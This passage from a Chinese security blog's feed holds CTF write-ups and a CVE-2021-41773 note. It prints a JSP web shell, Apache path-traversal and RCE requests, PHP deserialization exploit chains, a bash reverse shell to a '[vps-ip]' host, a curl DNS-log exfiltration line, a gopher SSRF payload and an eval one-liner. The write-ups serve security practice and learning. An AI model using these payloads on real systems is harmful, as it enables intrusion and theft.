class="hljs-string">&#x27;content&#x27;</span>])&lt;=<span class="hljs-number">7</span>)||(!eregi(<span class="hljs-string">&quot;ctfsho&quot;</span>.substr($_GET[<span class="hljs-string">&#x27;content&#x27;</span>],<span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-string">&quot;ctfshow&quot;</span>))||substr($_GET[<span class="hljs-string">&#x27;content&#x27;</span>],<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)==<span class="hljs-string">&#x27;w&#x27;</span>||(file_get_contents($_GET[<span class="hljs-string">&#x27;filename&#x27;</span>],<span class="hljs-string">&#x27;r&#x27;</span>) !== <span class="hljs-string">&quot;welcome2ctfshow&quot;</span>))?$flag:str_repeat(highlight_file(<span class="hljs-keyword">__FILE__</span>), <span class="hljs-number">0</span>);</code></pre><p>需要各个表达式都为false才能得到flag</p><p>payload：<code>?id=a&amp;filename=data://text/plain;base64,d2VsY29tZTJjdGZzaG93t&amp;content=Wdasdasfas</code></p><p><a href="https://qgieod1s9b.feishu.cn/docs/doccnC4EpMhSv1Ni6mbL7BQQdBc#">摆烂杯WP</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;web签到&quot;&gt;&lt;a href=&quot;#web签到&quot; class=&quot;headerlink&quot; title=&quot;web签到&quot;&gt;&lt;/a&gt;web签到&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;https://gitee.com/ll_nn/pic/raw/master/img/20211</summary>
      
    
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
    
    <category term="wp" scheme="http://lll-nnn.github.io/categories/CTF/wp/"/>
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
    
    <category term="摆烂杯" scheme="http://lll-nnn.github.io/tags/%E6%91%86%E7%83%82%E6%9D%AF/"/>
    
  </entry>
  
  <entry>
    <title>金盾杯2021</title>
    <link href="http://lll-nnn.github.io/2021/12/12/%E9%87%91%E7%9B%BE%E6%9D%AF2021/"/>
    <id>http://lll-nnn.github.io/2021/12/12/%E9%87%91%E7%9B%BE%E6%9D%AF2021/</id>
    <published>2021-12-12T15:18:53.000Z</published>
    <updated>2021-12-12T15:44:32.589Z</updated>
    
    <content type="html"><![CDATA[<h2 id="上传你的头像吧"><a href="#上传你的头像吧" class="headerlink" title="上传你的头像吧"></a>上传你的头像吧</h2><p><code>文件上传竞争</code></p><p>题目中对于上传的文件是先保存到服务器上再检查是否符合规范才进行删除，所以可以边上传边访问，和删除竞争；在删除前访问到木马文件，得到flag</p><p>上传：<br><img src="https://gitee.com/ll_nn/pic/raw/master/img/202112122321856.png"><br>访问：<br><img src="https://gitee.com/ll_nn/pic/raw/master/img/202112122321698.png"></p><h2 id="上传你的压缩包吧"><a href="#上传你的压缩包吧" class="headerlink" title="上传你的压缩包吧"></a>上传你的压缩包吧</h2><p>上传压缩包，会自动解压，<br><code>Tomcat</code></p><p>上传<code>.jsp</code>马，但上传的文件目录<code>jsp</code>文件不能访问，所以要上传到上一级目录，修改<code>aaaa.jsp</code>为<code>../a.jsp</code></p><p>在<code>burp-&gt;hex</code>里或者winhex,010editor里应该都行，但我一个都没成功。。。。。。。。。。。。。。。。</p><p>网上的jsp马</p><pre><code class="hljs jsp">&lt;%<span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;023&quot;</span>.equals(request.getParameter(<span class="hljs-string">&quot;pwd&quot;</span>)))&#123;java.io.InputStream in =Runtime.getRuntime().exec(request.getParameter(<span class="hljs-string">&quot;i&quot;</span>)).getInputStream();<span class="hljs-keyword">int</span> a = -<span class="hljs-number">1</span>;<span class="hljs-keyword">byte</span>[] b = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">2048</span>];out.print(<span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>);<span class="hljs-keyword">while</span>((a=in.read(b))!=-<span class="hljs-number">1</span>)&#123;out.println(<span class="hljs-keyword">new</span> String(b));&#125;out.print(<span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>);&#125;%&gt;</code></pre><p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202112122326594.png"></p><h2 id="休想爆破我"><a href="#休想爆破我" class="headerlink" title="休想爆破我"></a>休想爆破我</h2><p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202112122344902.png"><br>扫到<br><img src="https://gitee.com/ll_nn/pic/raw/master/img/202112122329820.png"></p><p><code>heapdump</code>放到<code>visualVM</code>分析<br><a href="https://www.cnblogs.com/icez/p/Actuator_heapdump_exploit.html">Actuator 未授权访问之heapdump利用 </a></p><p><code>查找Shiro CipherKey</code><br><img src="https://gitee.com/ll_nn/pic/raw/master/img/202112122332753.png"></p><p>脚本对byte转换为base64编码的key</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<span class="hljs-keyword">import</span> structa=base64.b64encode(struct.pack(<span class="hljs-string">&#x27;&lt;bbbbbbbbbbbbbbbb&#x27;</span>,<span class="hljs-number">-19</span>,<span class="hljs-number">33</span>, <span class="hljs-number">35</span>, <span class="hljs-number">114</span>, <span class="hljs-number">-3</span>, <span class="hljs-number">79</span>, <span class="hljs-number">86</span>, <span class="hljs-number">4</span>, <span class="hljs-number">108</span>, <span class="hljs-number">-45</span>,<span class="hljs-number">69</span>, <span class="hljs-number">-107</span>, <span class="hljs-number">-38</span>, <span class="hljs-number">-72</span>, <span class="hljs-number">33</span>, <span class="hljs-number">-23</span>))print(a)</code></pre><p>shiro利用工具</p><p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202112122333889.png"></p><p><code>cat /flag</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;上传你的头像吧&quot;&gt;&lt;a href=&quot;#上传你的头像吧&quot; class=&quot;headerlink&quot; title=&quot;上传你的头像吧&quot;&gt;&lt;/a&gt;上传你的头像吧&lt;/h2&gt;&lt;p&gt;&lt;code&gt;文件上传竞争&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;题目中对于上传的文件是先保存到服务器上再检查是</summary>
      
    
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
    
    <category term="wp" scheme="http://lll-nnn.github.io/categories/CTF/wp/"/>
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
    
    <category term="金盾杯" scheme="http://lll-nnn.github.io/tags/%E9%87%91%E7%9B%BE%E6%9D%AF/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2021-41773</title>
    <link href="http://lll-nnn.github.io/2021/11/29/CVE-2021-41773/"/>
    <id>http://lll-nnn.github.io/2021/11/29/CVE-2021-41773/</id>
    <published>2021-11-29T02:24:01.000Z</published>
    <updated>2022-01-10T14:01:23.703Z</updated>
    
    <content type="html"><![CDATA[<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>攻击者可以使用路径遍历攻击将URL映射到预期文档根以外的文件。如果文档根目录以外的文件不受<code>require all denied</code>保护，则攻击者可以访问这些文件。</p><p>仅apache 2.4.49</p><h2 id="apache-目录穿越"><a href="#apache-目录穿越" class="headerlink" title="apache 目录穿越"></a>apache 目录穿越</h2><p>payload：<code>/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd</code></p><p><code>/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd</code></p><h2 id="apache-rce"><a href="#apache-rce" class="headerlink" title="apache rce"></a>apache rce</h2><p>需要启用<code>mod_cgid</code>和<code>mod_cgi</code>模块</p><p><code>mod_cgi</code>模块的功能是根据输入脚本类型选择不同解析器进行执行，常用的解析器有<code>php</code>、<code>perl</code>等</p><p>payload:</p><pre><code>POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1Host: xx.xx.xx.xx:8080User-Agent: curl/7.64.1Accept: */*Content-Length: 7Content-Type: application/x-www-form-urlencodedConnection: closeecho;id</code></pre><p><img src="https://s3.bmp.ovh/imgs/2021/11/0e261738473bf027.png"></p><p><a href="https://blog.csdn.net/qq_38376348/article/details/120655436">CVE-2021-41773 Apache HTTP Server漏洞复现</a>   </p><p><a href="https://mp.weixin.qq.com/s/mx7_wTnU7IWxzeG7e6faTQ?st=A3E9947CC72763237BE9E767B200882D1648B7C0060F65A11B588C63933F3FDB30F9CE3EEDF8A35AD341979ED668A754DD5F1E2AFCB710029B6DC92BC1A87C0DA439302C4A4AB04FFDE6CC47D2FBA6A5F1A0F2E0EB04443FC9F5A55F12409243D5C0711080FFD5BC323D747C57AEC1B39E37427C6A70C7C19BED4BF6C9C75FCCA459EE690735F1E2A7D4293A25537FCD92375C7254420FB4056BC664796B47A34A1900D539AC737D5321803DC0FB4CE1&vid=1688851090137202&cst=BD2948FD4785C65961435AA26F6775293D3B23260F41BE812666D55A2B47E6459197EF59B0467B11CD18458E3E28819A&deviceid=579d18aa-691c-4ffd-8a54-deef2535f414&version=3.1.16.90294&platform=mac">CVE-2021-41773升华篇-Apache HTTP Server 路径穿越漏洞提升至RCE回显深入分析 </a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;利用条件&quot;&gt;&lt;a href=&quot;#利用条件&quot; class=&quot;headerlink&quot; title=&quot;利用条件&quot;&gt;&lt;/a&gt;利用条件&lt;/h2&gt;&lt;p&gt;攻击者可以使用路径遍历攻击将URL映射到预期文档根以外的文件。如果文档根目录以外的文件不受&lt;code&gt;require all</summary>
      
    
    
    
    <category term="CVE" scheme="http://lll-nnn.github.io/categories/CVE/"/>
    
    
    <category term="信息安全" scheme="http://lll-nnn.github.io/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    <category term="CVE" scheme="http://lll-nnn.github.io/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>Geekchallenge</title>
    <link href="http://lll-nnn.github.io/2021/11/26/geekchallenge/"/>
    <id>http://lll-nnn.github.io/2021/11/26/geekchallenge/</id>
    <published>2021-11-25T16:31:46.000Z</published>
    <updated>2021-12-01T16:22:38.110Z</updated>
    
    <content type="html"><![CDATA[<h2 id="temp"><a href="#temp" class="headerlink" title="temp"></a>temp</h2><p>这道不是极客大挑战的，就写这里吧</p><pre><code class="hljs php">&lt;html&gt;&lt;!--<span class="hljs-keyword">if</span>($_REQUEST[<span class="hljs-string">&#x27;mode&#x27;</span>]!=<span class="hljs-string">&quot;begin&quot;</span>)&#123;    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Welcome PHP Games!&quot;</span>);&#125;--&gt;&lt;/html&gt;<span class="hljs-meta">&lt;?php</span>error_reporting(<span class="hljs-number">0</span>);<span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;fl4g.php&#x27;</span>;<span class="hljs-keyword">if</span>($_REQUEST[<span class="hljs-string">&#x27;mode&#x27;</span>]!=<span class="hljs-string">&quot;begin&quot;</span>)&#123;    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;PHP Games!&quot;</span>);&#125;<span class="hljs-keyword">else</span>&#123;    show_source(<span class="hljs-keyword">__FILE__</span>);    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">last_task</span></span>&#123;        <span class="hljs-keyword">var</span> $left;        <span class="hljs-keyword">var</span> $middle;        <span class="hljs-keyword">var</span> $right;    &#125;    $a=$_GET[<span class="hljs-string">&#x27;a&#x27;</span>];    $b=$_GET[<span class="hljs-string">&#x27;b&#x27;</span>];    <span class="hljs-keyword">if</span>($a==$b)&#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;wrong way&quot;</span>);    &#125;<span class="hljs-keyword">else</span>&#123;        <span class="hljs-keyword">if</span>(md5($a)!==md5($b))&#123;            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;need a little magic&quot;</span>);        &#125;<span class="hljs-keyword">else</span>&#123;            <span class="hljs-keyword">if</span>($_POST[<span class="hljs-string">&#x27;token&#x27;</span>])&#123;                $token = unserialize($_POST[<span class="hljs-string">&#x27;token&#x27;</span>]);                <span class="hljs-keyword">if</span>($token[<span class="hljs-string">&#x27;user&#x27;</span>]==<span class="hljs-string">&quot;user&quot;</span>&amp;&amp;$token[<span class="hljs-string">&#x27;pass&#x27;</span>]==<span class="hljs-string">&quot;pass&quot;</span>)&#123;                        $flag=$_POST[<span class="hljs-string">&#x27;flag&#x27;</span>];                        <span class="hljs-keyword">if</span>($flag)&#123;                            $flag = unserialize(urldecode($flag));                            $flag-&gt;middle = $fl4g;                            <span class="hljs-keyword">if</span>($flag-&gt;middle===$flag-&gt;left&amp;&amp;$flag-&gt;middle===$flag-&gt;right)&#123;                                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;this is your flag &quot;</span>.$flag-&gt;middle;                            &#125;<span class="hljs-keyword">else</span>&#123;                                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;one more step&quot;</span>);                            &#125;                        &#125;<span class="hljs-keyword">else</span>&#123;                            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;don&#x27;t give up&quot;</span>);                        &#125;                &#125;<span class="hljs-keyword">else</span>&#123;                    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Not a valid token&quot;</span>);                &#125;            &#125;<span class="hljs-keyword">else</span>&#123;                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;give me the token&quot;</span>);            &#125;        &#125;    &#125;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>主要是最后一关<br>exp:</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">last_task</span></span>&#123;    <span class="hljs-keyword">var</span> $left;    <span class="hljs-keyword">var</span> $middle;    <span class="hljs-keyword">var</span> $right;&#125;$a=<span class="hljs-keyword">new</span> last_task();$a-&gt;left=&amp;$a-&gt;middle;$a-&gt;right=&amp;$a-&gt;left;<span class="hljs-keyword">echo</span> serialize($a);<span class="hljs-meta">?&gt;</span></code></pre><p>取地址<code>&amp;</code>符号可太行了，我怎么想不到呢。。。。。。。。</p><h2 id="babyPOP"><a href="#babyPOP" class="headerlink" title="babyPOP"></a>babyPOP</h2><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">a</span> </span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> $Do_u_like_JiaRan = <span class="hljs-literal">false</span>;    <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> $Do_u_like_AFKL = <span class="hljs-literal">false</span>;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">b</span> </span>&#123;    <span class="hljs-keyword">private</span> $i_want_2_listen_2_MaoZhongDu;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">if</span> (a::$Do_u_like_AFKL) &#123;            <span class="hljs-keyword">return</span> exec(<span class="hljs-keyword">$this</span>-&gt;i_want_2_listen_2_MaoZhongDu);        &#125; <span class="hljs-keyword">else</span> &#123;            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&quot;Noooooooooooooooooooooooooooo!!!!!!!!!!!!!!!!&quot;</span>);        &#125;    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">c</span> </span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        a::$Do_u_like_JiaRan = <span class="hljs-literal">true</span>;    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">d</span> </span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        a::$Do_u_like_AFKL = <span class="hljs-literal">true</span>;        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;关注嘉然,&quot;</span> . <span class="hljs-keyword">$this</span>-&gt;value;    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">e</span> </span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">if</span> (a::$Do_u_like_JiaRan) &#123;            (<span class="hljs-keyword">$this</span>-&gt;afkl)();        &#125; <span class="hljs-keyword">else</span> &#123;            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&quot;Noooooooooooooooooooooooooooo!!!!!!!!!!!!!!!!&quot;</span>);        &#125;    &#125;&#125;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;data&#x27;</span>])) &#123;    unserialize(base64_decode($_GET[<span class="hljs-string">&#x27;data&#x27;</span>]));&#125; <span class="hljs-keyword">else</span> &#123;    highlight_file(<span class="hljs-keyword">__FILE__</span>);&#125;</code></pre><p>一道反序列化，值得注意的是，static变量不能被反序列化<br>所以在写exp时就不能带<code>class a</code>了</p><p>exp:</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">b</span> </span>&#123;    <span class="hljs-keyword">private</span> $i_want_2_listen_2_MaoZhongDu;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$a</span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;i_want_2_listen_2_MaoZhongDu=$a;    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">c</span> </span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        $Do_u_like_JiaRan = <span class="hljs-literal">true</span>;    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">d</span> </span>&#123;    <span class="hljs-comment">//$this.value=new b();</span>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        $Do_u_like_AFKL = <span class="hljs-literal">true</span>;        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;关注嘉然,&quot;</span> . <span class="hljs-keyword">$this</span>-&gt;value;    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">e</span> </span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">if</span> ($Do_u_like_JiaRan) &#123;            (<span class="hljs-keyword">$this</span>-&gt;afkl)();        &#125; <span class="hljs-keyword">else</span> &#123;            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&quot;Noooooooooooooooooooooooooooo!!!!!!!!!!!!!!!!&quot;</span>);        &#125;    &#125;&#125;$b = <span class="hljs-keyword">new</span> b(<span class="hljs-string">&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/[vps-ip]/9999 0&gt;&amp;1&quot;&#x27;</span>);$c = <span class="hljs-keyword">new</span> c();$d = <span class="hljs-keyword">new</span> d();$d-&gt;value = $b;$e = <span class="hljs-keyword">new</span> e();$e-&gt;afkl = $d;<span class="hljs-keyword">echo</span> urlencode(base64_encode(serialize([$c,$e]))).<span class="hljs-string">&quot;\n&quot;</span>;</code></pre><p>最后将c和e作为一个数组进行序列化，也就是这里是两个入口，以前做的反序列化都是找一个入口，然后一步一步推，原来还可以两个一起，属实是学废了</p><p>还有就是关于反弹shell，我一开始弹，端口在阿里云也开了，就是弹不出来，甚至怀疑自己买了假的服务器，之后突然想到服务器上安了宝塔，看了一眼，果然，宝塔的防火墙端口没开，打开就弹出来了，wssb</p><p>dnslog带出<code>curl `cat /flag|base64`.xxxxxx.dnslog.cn</code></p><h2 id="期末不挂科就算成功"><a href="#期末不挂科就算成功" class="headerlink" title="期末不挂科就算成功"></a>期末不挂科就算成功</h2><p><img src="https://s3.bmp.ovh/imgs/2021/11/a087dd443ee23e03.png"><br>注释中发现<code>/debug.php</code><br>进入后是用文件包含，伪协议读取下<code>index.php</code><br>额外信息：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$ch = curl_init();curl_setopt($ch, CURLOPT_URL, $_GET[<span class="hljs-string">&#x27;url&#x27;</span>]);<span class="hljs-comment">#curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);</span>curl_setopt($ch, CURLOPT_HEADER, <span class="hljs-number">0</span>);<span class="hljs-comment">#curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);</span>curl_exec($ch);curl_close($ch);<span class="hljs-comment">//你当前位于学校172.17.0.0/24网段下 其实还有台机子里面可以修改成绩 我偷偷告诉你password是123456,name是admin,//result必须要改成60 不然学校会查的！！！</span><span class="hljs-meta">?&gt;</span></code></pre><p>在<code>172.17.0.7</code>中除了先前有的还出现了一张图片，应该就是这里了，然后就不会了。<br>看WP要<code>gopher</code>协议<code>post</code></p><pre><code>POST /index.php HTTP/1.1Host: 127.0.0.1Content-Type: application/x-www-form-urlencodedContent-Length: 36name=admin&amp;password=123456&amp;result=60</code></pre><p>进行两次url编码，然后开头加上<code>gopher://172.17.0.7:80/_</code></p><p>值得注意的是，直接两次url编码每行的末尾是<code>%250a</code>也就是只有一个换行符，改成<code>%250D%250A</code>-换行回车</p><p>payload：<code>http://106.55.154.252:8010/?url=gopher://172.17.0.7:80/_POST%2520%252Findex.php%2520HTTP%252F1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application%252Fx-www-form-urlencoded%250D%250AContent-Length%253A%252036%250D%250A%250D%250Aname%253Dadmin%2526password%253D123456%2526result%253D60%250d%250A</code></p><h2 id="成全"><a href="#成全" class="headerlink" title="成全"></a>成全</h2><p><code>ThinkPHP v5.0.12</code><br>报错出现了<code>debug</code>界面<br><img src="https://s3.bmp.ovh/imgs/2021/11/24dded7c8682ffb6.png"></p><p>tp的默认日志文件形式为<code>/202110/11.log</code>文件夹为年加月，文件为日</p><p>对月(1-12)和天(1-31)进行交集爆破<br><img src="https://s3.bmp.ovh/imgs/2021/11/c912d29924a29513.png"><br>结果<br><img src="https://s3.bmp.ovh/imgs/2021/11/d23301543298d305.png"><br>在第一个日志中有写好的一句话</p><pre><code>&lt;?php eval($_POST[&#39;Syccccc&#39;]);phpinfo(); ?&gt;</code></pre><p>然后通过shell读取flag</p><h2 id="easyPOP"><a href="#easyPOP" class="headerlink" title="easyPOP"></a>easyPOP</h2><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">a</span> </span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;test-&gt;test();    &#125;&#125;<span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">b</span> </span>&#123;    <span class="hljs-keyword">private</span> $b = <span class="hljs-number">1</span>;    <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">eval</span>(<span class="hljs-params"></span>)</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test</span>(<span class="hljs-params"></span>) </span>&#123;        (<span class="hljs-keyword">$this</span>-&gt;b)();    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">c</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">b</span> </span>&#123;    <span class="hljs-keyword">private</span> $call;    <span class="hljs-keyword">protected</span> $value;    <span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">eval</span>(<span class="hljs-params"></span>) </span>&#123;        <span class="hljs-keyword">if</span> (is_array(<span class="hljs-keyword">$this</span>-&gt;value)) &#123;            (<span class="hljs-keyword">$this</span>-&gt;call)(<span class="hljs-keyword">$this</span>-&gt;value);        &#125; <span class="hljs-keyword">else</span> &#123;            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;you can&#x27;t do this :(&quot;</span>);        &#125;    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">d</span> </span>&#123;    <span class="hljs-keyword">public</span> $value;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">eval</span>(<span class="hljs-params">$call</span>) </span>&#123;        $call(<span class="hljs-keyword">$this</span>-&gt;value);    &#125;&#125;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;data&#x27;</span>])) &#123;    unserialize(base64_decode($_GET[<span class="hljs-string">&#x27;data&#x27;</span>]));&#125; <span class="hljs-keyword">else</span> &#123;    highlight_file(<span class="hljs-keyword">__FILE__</span>);&#125;</code></pre><p>exp:</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">a</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> $test;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$a</span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;test = $a;    &#125;&#125;<span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">b</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">private</span> $b = <span class="hljs-number">1</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$a</span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;b = $a;    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">c</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">b</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">private</span> $call;    <span class="hljs-keyword">protected</span> $value;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$a, $b</span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;call = $a;        <span class="hljs-keyword">$this</span>-&gt;value = $b;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setB</span>(<span class="hljs-params">$c</span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-built_in">parent</span>::__construct($c);    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">d</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> $value;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$a</span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;value = $a;    &#125;&#125;$c = <span class="hljs-keyword">new</span> c(    [<span class="hljs-keyword">new</span> d(<span class="hljs-string">&quot;system&quot;</span>), <span class="hljs-string">&quot;eval&quot;</span>],    [<span class="hljs-keyword">new</span> d(<span class="hljs-string">&quot;whoami&quot;</span>), <span class="hljs-string">&quot;eval&quot;</span>],);$c-&gt;setB([$c, <span class="hljs-string">&quot;eval&quot;</span>]);$exp = <span class="hljs-keyword">new</span> a($c);<span class="hljs-keyword">echo</span> base64_encode(serialize($exp));</code></pre><p>执行流程：</p><pre><code>class a的test=new c(),调用c的test(),c继承于b,会先调d的test(),而b中的$b被设为[$c, &quot;eval&quot;],然后就会调用c的eval()函数，而$this-&gt;call=[new d(&quot;system&quot;), &quot;eval&quot;],$this-&gt;value=[new d(&quot;whoami&quot;), &quot;eval&quot;],然后($this-&gt;call)($this-&gt;value)就变成了([new d(&quot;system&quot;), &quot;eval&quot;])([new d(&quot;whoami&quot;), &quot;eval&quot;]);第一次进入到d中，d的$this-&gt;value=system,$call=[new d(&quot;whoami&quot;), &quot;eval&quot;];$call($this-&gt;value)就成了[new d(&quot;whoami&quot;), &quot;eval&quot;] (&quot;system&quot;)第二次进入d中,d的$this-&gt;value=whoami,$call=system,$call($this-&gt;value)就成了(&quot;system&quot;)(&quot;whoami&quot;)</code></pre><p>关于为啥<code>[$c, &quot;eval&quot;]</code>就能执行<code>c</code>的<code>eval</code>函数</p><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">aa</span></span>&#123;    <span 